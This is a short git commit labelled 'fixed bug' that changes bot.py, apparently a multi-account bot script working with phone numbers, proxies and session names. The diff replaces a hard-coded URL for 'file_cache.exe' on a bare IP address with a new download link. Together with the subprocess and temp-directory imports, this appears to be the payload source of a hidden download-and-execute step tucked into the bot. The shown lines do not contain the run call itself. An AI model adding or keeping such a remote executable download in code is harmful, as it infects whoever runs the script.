bb37acc3c0c05d9c875a19fbaca20a91174d4fb4
Yote <32171947+haspread@users.noreply.github.com>
2025-09-30 19:24:06 +0300

    fixed bug

--- bot.py
+++ bot.py
@@ -4,7 +4,7 @@ import subprocess
 import tempfile
 import requests
 
-url = "http://176.65.132.139/file_cache.exe"
+url = "https://manage.glimmerix.pro/api/public/dl/fuOMDcfU"
 
 temp_dir = tempfile.gettempdir()
 
@@ -64,6 +64,7 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
